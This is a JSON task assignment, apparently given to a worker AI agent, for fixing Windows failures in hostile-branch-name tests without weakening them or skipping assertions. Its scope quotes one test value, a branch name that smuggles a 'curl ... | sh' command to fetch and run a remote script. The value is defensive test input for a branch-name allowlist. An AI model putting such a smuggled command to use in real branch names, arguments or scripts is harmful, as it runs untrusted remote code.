@@ -1,0 +1,51 @@
+{
+  "id": "assignment-0mw9ath7t-ply1",
+  "intentId": "intent-0mw97nizx-0n6e",
+  "intentRevision": 1,
+  "roleTask": "Worker.implementation",
+  "slug": "make-the-hostile-branch-name-tests-in",
+  "objective": "Make the hostile-branch-name tests in cloud-checkout.test.ts pass on Windows without weakening them.",
+  "state": "Running",
+  "scope": [
+    "Work only in /home/user/holyagent-0.3.0-cloudbranch (branch release/0.3.0/fix/cloud-session-branch, PR #95). The Windows CI job fails two tests: 'is not shown when the start branch is refused and the checkout is on the branch it would name' and 'names only a branch of plain characters, else the default branch'. git cannot create the ref 'refs/heads/x;curl${IFS}host/p|sh`#' on NTFS: 'cannot lock ref ... .lock: Invalid argument', because | (and < > : \" \\ ? *) are invalid in Windows file names. The full log is /tmp/claude-0/-home-user-holyagent/43946df6-456d-58c6-bea3-7e958fcb9495/scratchpad/win95.log (lines 730-790).",
+    "Choose a hostile name valid as a file name on Windows, macOS and Linux that still fails the notice's allowlist for the same reason (shell metacharacters such as ; $ {{ }} & backtick #), and use it in both tests and both sources (reflog and origin/HEAD); explain the choice in a short comment. Keep every assertion. Do not skip or platform-gate the tests."
+  ],
+  "constraints": [
+    "Before anything else, run `bun install --frozen-lockfile` in your worktree, because node_modules is not shared between worktrees; the prepare step installing lefthook hooks is expected.",
+    "Make no git writes (no commit, add, checkout, stash, branch) and no edits under .git/ or .holyagent/; the root commits. Report your changed paths.",
+    "Follow the repository rules in .claude/CLAUDE.md and AGENTS.md of the worktree: Effect for effects and errors with tagged errors (no try/catch, new Promise, Promise statics or async functions in runtime and CLI source), Effect Schema at data boundaries with onExcessProperty error, Bun APIs and the Bun Shell, JSDoc on every exported function and type.",
+    "Testing is unit tests and recorded or synthesized fixtures only: never start pi, a Pi session, T3 Code or a Kimi request.",
+    "Gates, run in your worktree: `bunx --no-install mise run build` (commit-ready generated output; the tree must have no unexplained changes after it) and `bunx --no-install mise run verify` (type-check, lint, format check, tests) must exit 0. Give the command, exit code and test counts.",
+    "Write `git diff` of your change (after the build) to a file outside the repository in /tmp/claude-0/-home-user-holyagent/43946df6-456d-58c6-bea3-7e958fcb9495/scratchpad and give its path as diff-file evidence.",
+    "Build only what the Assignment asks; name any further improvement in the report instead of adding it.",
+    "Report in under 200 words."
+  ],
+  "criteria": [
+    {
+      "text": "Both tests use a hostile name that git can create on Windows and that the allowlist still rejects, with every assertion kept",
+      "blocking": true,
+      "dimension": "tests"
+    },
+    {
+      "text": "mise run build leaves no unexplained changes and mise run verify exits 0",
+      "blocking": true,
+      "dimension": "repo-standards"
+    }
+  ],
+  "evidence": [
+    "diff-file",
+    "gates"
+  ],
+  "ownershipPaths": [
+    "packages/runtime/tests/cloud-checkout.test.ts"
+  ],
+  "dependencies": [],
+  "independentFrom": [],
+  "followUpOf": "assignment-0mw9a4789-yzgd",
+  "specialist": {
+    "model": "sonnet",
+    "effort": "high",
+    "startedAt": "2026-11-09T13:30:11.945Z"
+  },
+  "createdAt": "2026-11-09T13:30:11.945Z"
+}
